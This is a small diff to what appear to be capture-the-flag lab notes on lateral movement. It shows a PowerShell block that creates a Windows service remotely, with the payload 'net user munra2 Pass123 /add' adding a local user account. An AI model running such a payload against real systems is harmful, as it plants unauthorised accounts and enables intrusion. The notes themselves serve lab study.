@@ -60,7 +60,7 @@ Plan:
 `Name = "THMService2";`  
 `DisplayName = "THMService2";`  
 `PathName = "net user munra2 Pass123 /add"; # Your payload`  
-`ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process`  
+`ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process`
 `StartMode = "Manual"`
 `}`
 
